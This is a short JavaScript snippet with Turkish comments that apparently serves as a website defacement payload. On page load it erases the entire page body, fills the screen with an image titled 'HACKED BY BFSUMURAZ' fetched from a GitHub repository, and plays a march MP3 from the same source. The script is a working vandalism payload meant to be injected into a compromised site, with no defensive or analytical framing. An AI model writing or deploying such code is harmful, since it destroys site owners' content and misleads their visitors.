window.addEventListener('load', () => {
            // Arka plan fotoğrafının URL'si
            const imageUrl = 'https://raw.githubusercontent.com/SumurazMirzayev/meet.js/main/HACKED%20BY%20BFSUMURAZ.png';
            // MP3 dosyasının URL'si
            const audioUrl = 'https://github.com/SumurazMirzayev/meet.js/raw/main/Payitaht%20Abd%C3%BClhamid%20-%20Gazi%20Osman%20Pa%C5%9Fa%20(Plevne%20Mar%C5%9F%C4%B1).mp3';

            // Tüm sayfa içeriğini temizle
            document.body.innerHTML = '';

            // Arka plan fotoğrafını ayarla
            document.body.style.margin = '0';
            document.body.style.overflow = 'hidden';
            document.body.style.position = 'relative';
            document.body.style.height = '100vh';
            document.body.style.width = '100vw';

            const background = document.createElement('div');
            background.style.position = 'absolute';
            background.style.top = '0';
            background.style.left = '0';
            background.style.width = '100%';
            background.style.height = '100%';
            background.style.backgroundImage = `url(${imageUrl})`;
            background.style.backgroundSize = 'cover';
            background.style.backgroundPosition = 'center';
            background.style.backgroundRepeat = 'no-repeat';
            background.style.zIndex = '-1'; // Arka plan fotoğrafını tüm diğer içeriklerin arkasına alır

            // Arka plan fotoğrafını ekle
            document.body.appendChild(background);

            // MP3 dosyasını çal
            const audio = new Audio(audioUrl);
            audio.preload = 'auto';
            audio.play().catch(error => {
                console.error('Oynatma hatası:', error);
            });
        });
